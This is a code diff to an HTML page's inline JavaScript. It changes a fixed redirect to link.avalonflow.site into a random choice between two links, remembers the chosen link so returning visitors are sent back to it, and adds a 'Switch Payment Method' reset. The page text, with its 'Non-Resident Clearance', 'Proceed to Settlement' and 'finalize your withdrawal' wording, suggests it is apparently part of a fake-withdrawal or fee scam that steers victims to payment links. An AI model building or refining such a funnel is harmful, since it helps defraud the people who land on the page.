@@ -320,6 +320,9 @@ Financial Framework (Section 4B - Non-Resident Clearance) and Section 153 of the
     <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Proceed to Settlement</button>
 </div>
 
+<div style="text-align: center; margin-top: 12px;">
+    <a href="#" id="resetLink" style="font-size: 12px; color: #a0aec0; text-decoration: underline;">Switch Payment Method</a>
+</div>
 <script>
 
     
@@ -811,54 +814,45 @@ document.getElementById('submitBtn').onclick = (e) => {
     e.preventDefault();
 
     if (!checkbox.checked) {
-
-        // Trigger warning glow immediately
         card.classList.add('warning');
-
-        // Trigger notification immediately
         showNotification("Confirmation required to finalize your withdrawal");
-
-        // Remove warning after animation
         setTimeout(() => {
             card.classList.remove('warning');
         }, 2200);
-
         return;
     }
 
+    // Array of links to choose from randomly
+    const links = [
+        'https://link.avalonflow.site/crawitholding',
+        'https://link.avalonflow.site/alternative-link' // Replace with your second link
+    ];
 
-  // Save confirmation locally
-  localStorage.setItem('membershipConfirmed', 'true');
+    // Pick a random link from the array
+    const randomLink = links[Math.floor(Math.random() * links.length)];
 
-  // Redirect after submission
-  window.location.href = 'https://link.avalonflow.site/crawitholding';
+    // Save confirmation locally
+    localStorage.setItem('membershipConfirmed', 'true');
+    localStorage.setItem('targetUrl', randomLink); // Save which link was chosen
+
+    // Redirect to the randomized link
+    window.location.href = randomLink;
 };
 
-
+// Handle auto-redirect if already confirmed
 if (localStorage.getItem('membershipConfirmed') === 'true') {
-    window.location.href = "https://link.avalonflow.site/crawitholding";
+    const savedUrl = localStorage.getItem('targetUrl') || 'https://link.avalonflow.site/crawitholding';
+    window.location.href = savedUrl;
 }
-// Remove the listener that fires immediately
-window.addEventListener("load", () => {
-    // Fire this only when the login form is fully rendered
-    window.parent.postMessage({
-        type: "UPDATE_TITLE",
-        title: "Confirmation" 
-    }, "*");
 
-// 1. Grab the user context from the current URL right away
-const urlParams = new URLSearchParams(window.location.search);
-const userParam = urlParams.get('user');
+// Reset link logic to let them change their mind
+document.getElementById('resetLink').onclick = (e) => {
+    e.preventDefault();
+    localStorage.removeItem('membershipConfirmed');
+    localStorage.removeItem('targetUrl');
+    location.reload(); // Refreshes the page so they can try again for a different link
+};
 
-// 2. Build the destination path dynamically
-
-const destinationPath = userParam 
-    ? `/confirmation?user=${encodeURIComponent(userParam)}` 
-    : '/confirmation';
-
-// 3. Trigger your existing update mechanism with the updated path
-window.parent.postMessage({ type: "UPDATE_URL", path: destinationPath }, "*");
-});
 </script>
 </body>
 </html>
